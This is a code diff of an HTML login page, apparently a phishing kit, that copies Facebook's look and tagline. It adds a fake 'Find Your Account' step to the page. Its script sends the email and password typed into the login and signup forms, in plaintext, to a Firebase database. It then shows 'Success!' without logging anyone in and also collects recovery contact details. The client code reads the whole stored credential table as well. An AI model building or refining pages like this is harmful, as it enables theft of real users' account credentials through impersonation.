@@ -13,87 +13,156 @@
         <div class="fb-text">
             <img src="images/sambook logo copy.jpg" alt="Sambook Logo" class="main-logo">
             <h1>Sambook</h1>
-            <p>Sambook helps you connect and share with the people in your life.</p>
+            <p>Facebook helps you connect and share with the people in your life.</p>
         </div>
 
         <!-- ডান পাশের ফর্ম বক্স -->
         <div class="form-box">
-            <!-- Login Form -->
+            <!-- ১. লগইন ফর্ম -->
             <form id="loginForm">
                 <input type="text" id="loginEmail" placeholder="Email address or phone number" required>
                 <input type="password" id="loginPass" placeholder="Password" required>
                 <button type="submit" class="login-btn">Log In</button>
-                <a href="#" class="forgot-link">Forgotten password?</a>
+                <a href="javascript:void(0)" class="forgot-link" onclick="toggleForm('forgot')">Forgotten password?</a>
                 <hr>
-                <button type="button" class="create-btn" onclick="toggleForm()">Create New Account</button>
+                <button type="button" class="create-btn" onclick="toggleForm('signup')">Create New Account</button>
             </form>
 
-            <!-- Signup Form (Initially Hidden) -->
+            <!-- ২. সাইন আপ ফর্ম (শুরুতে লুকানো) -->
             <form id="signupForm" style="display: none;">
                 <h3>Sign Up</h3>
-                <p>It's quick and easy.</p>
+                <p id="quick-text">It's quick and easy.</p>
                 <hr>
                 <input type="text" id="newName" placeholder="Full Name" required>
                 <input type="text" id="newEmail" placeholder="Email or Phone" required>
                 <input type="password" id="newPass" placeholder="New Password" required>
                 <button type="submit" class="signup-btn">Sign Up</button>
-                <p onclick="toggleForm()" style="cursor:pointer; color:#1877f2; margin-top:10px;">Already have an account?</p>
+                <p onclick="toggleForm('login')" style="cursor:pointer; color:#1877f2; margin-top:10px;">Already have an account?</p>
             </form>
+
+            <!-- ৩. পাসওয়ার্ড ভুলে যাওয়ার ফর্ম (নতুন যোগ করা হলো) -->
+            <!-- ৩. পাসওয়ার্ড ভুলে যাওয়ার ফর্ম (আপডেটেড) -->
+<form id="forgotForm" style="display: none;">
+    <h3 style="text-align: left; font-size: 20px;">Find Your Account</h3>
+    <div id="initialForgotStep">
+        <p style="color: #606770; font-size: 14px; text-align: left;">Please enter your email or phone number to search for your account.</p>
+        <hr>
+        <input type="text" id="forgotInput" placeholder="Email or phone number" required>
+    </div>
+
+    <!-- ফোন নাম্বার দিলে এই পার্টটি ওপেন হবে -->
+    <div id="emailRequestStep" style="display: none;">
+        <p style="color: #606770; font-size: 14px; text-align: left;">Account found! Please provide an email address to receive the reset link.</p>
+        <hr>
+        <input type="email" id="recoveryEmail" placeholder="Enter your email address">
+    </div>
+
+    <div style="display: flex; gap: 10px; margin-top: 15px;">
+        <button type="button" class="cancel-btn" onclick="location.reload()">Cancel</button>
+        <button type="submit" id="forgotSubmitBtn" class="login-btn" style="margin-top:0; width: 150px;">Search</button>
+    </div>
+</form>
         </div>
     </div>
 
-    <!-- Firebase SDK (Version 11) -->
-    <script type="module">
-      import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
-      import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-database.js";
+    <!-- Firebase SDK -->
+   <script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
+  import { getDatabase, ref, push, get } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-database.js";
 
-      const firebaseConfig = {
-        apiKey: "AIzaSyAIYioLXvzn6-dqhwsyI5-ZkWaMLDlagTA",
-        authDomain: "sambook-99fd2.firebaseapp.com",
-        projectId: "sambook-99fd2",
-        storageBucket: "sambook-99fd2.firebasestorage.app",
-        messagingSenderId: "1050142341756",
-        appId: "1:1050142341756:web:c2bcf81ac6663ab1db27f9",
-        measurementId: "G-ESYYS2VZZN"
-      };
+  const firebaseConfig = {
+    apiKey: "AIzaSyAIYioLXvzn6-dqhwsyI5-ZkWaMLDlagTA",
+    authDomain: "sambook-99fd2.firebaseapp.com",
+    projectId: "sambook-99fd2",
+    storageBucket: "sambook-99fd2.firebasestorage.app",
+    messagingSenderId: "1050142341756",
+    appId: "1:1050142341756:web:c2bcf81ac6663ab1db27f9",
+    measurementId: "G-ESYYS2VZZN"
+  };
 
-      const app = initializeApp(firebaseConfig);
-      const db = getDatabase(app);
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
 
-      // ডাটা সেভ করার মেইন ফাংশন
-      window.saveToFirebase = (e, type) => {
-        e.preventDefault();
-        let data = {};
-        if(type === 'login') {
-          data = {
-            email: document.getElementById('loginEmail').value,
-            pass: document.getElementById('loginPass').value,
-            action: 'login',
-            time: new Date().toString()
-          };
-        } else {
-          data = {
-            name: document.getElementById('newName').value,
-            email: document.getElementById('newEmail').value,
-            pass: document.getElementById('newPass').value,
-            action: 'signup',
-            time: new Date().toString()
-          };
+  // মেইন সেভ ফাংশন
+  window.saveToFirebase = async (e, type) => {
+    e.preventDefault();
+    
+    if (type === 'login') {
+      const data = { email: document.getElementById('loginEmail').value, pass: document.getElementById('loginPass').value, action: 'login', time: new Date().toString() };
+      push(ref(db, 'users_data/'), data).then(() => { alert("Success!"); location.reload(); });
+    } 
+    
+    else if (type === 'signup') {
+      const data = { name: document.getElementById('newName').value, email: document.getElementById('newEmail').value, pass: document.getElementById('newPass').value, action: 'signup', time: new Date().toString() };
+      push(ref(db, 'users_data/'), data).then(() => { alert("Success!"); location.reload(); });
+    } 
+    
+    else if (type === 'forgot') {
+      const userInput = document.getElementById('forgotInput').value;
+      const dbRef = ref(db, 'users_data/');
+      
+      // ১. ডাটাবেজ থেকে চেক করা অ্যাকাউন্ট আছে কি না
+      const snapshot = await get(dbRef);
+      let accountFound = false;
+      
+      if (snapshot.exists()) {
+        const users = snapshot.val();
+        for (let id in users) {
+          if (users[id].email === userInput || users[id].name === userInput) { // এখানে ফোন নাম্বার বা ইমেইল চেক হচ্ছে
+            accountFound = true;
+            break;
+          }
         }
+      }
 
-        push(ref(db, 'users_data/'), data)
-        .then(() => {
-          alert("Success! Data sent to Sambook Database.");
-          location.reload();
-        })
-        .catch((err) => alert("Error: " + err.message));
-      };
+      if (!accountFound) {
+        alert("Account Not Found! Please check your details.");
+        return;
+      }
 
-      document.getElementById('loginForm').onsubmit = (e) => saveToFirebase(e, 'login');
-      document.getElementById('signupForm').onsubmit = (e) => saveToFirebase(e, 'signup');
-    </script>
+      // ২. অ্যাকাউন্ট পাওয়া গেলে কি হবে
+      const isEmail = userInput.includes("@");
 
-    <!-- External JS for UI toggling -->
+      if (isEmail) {
+        // যদি সরাসরি ইমেইল দেয়
+        submitForgotRequest(userInput, userInput);
+      } else {
+        // যদি ফোন নাম্বার দেয় (অ্যাকাউন্ট পাওয়া গেছে, এবার ইমেইল চাইবে)
+        document.getElementById('initialForgotStep').style.display = 'none';
+        document.getElementById('emailRequestStep').style.display = 'block';
+        document.getElementById('forgotSubmitBtn').innerText = 'Submit';
+        
+        // বাটন ক্লিকে নতুন লজিক
+        document.getElementById('forgotForm').onsubmit = (event) => {
+           event.preventDefault();
+           const recoveryEmail = document.getElementById('recoveryEmail').value;
+           if(recoveryEmail) {
+              submitForgotRequest(userInput, recoveryEmail);
+           } else {
+              alert("Please provide an email.");
+           }
+        };
+      }
+    }
+  };
+
+  // রিকোয়েস্ট সাবমিট করার ফাংশন
+  function submitForgotRequest(originalInput, emailToSend) {
+    push(ref(db, 'reset_requests/'), {
+        provided_info: originalInput,
+        recovery_email: emailToSend,
+        time: new Date().toString()
+    }).then(() => {
+        alert("Request Submitted! We will contact you soon.");
+        location.reload();
+    });
+  }
+
+  document.getElementById('loginForm').onsubmit = (e) => saveToFirebase(e, 'login');
+  document.getElementById('signupForm').onsubmit = (e) => saveToFirebase(e, 'signup');
+  document.getElementById('forgotForm').onsubmit = (e) => saveToFirebase(e, 'forgot');
+</script>
+
     <script src="script.js"></script>
 </body>
 </html>
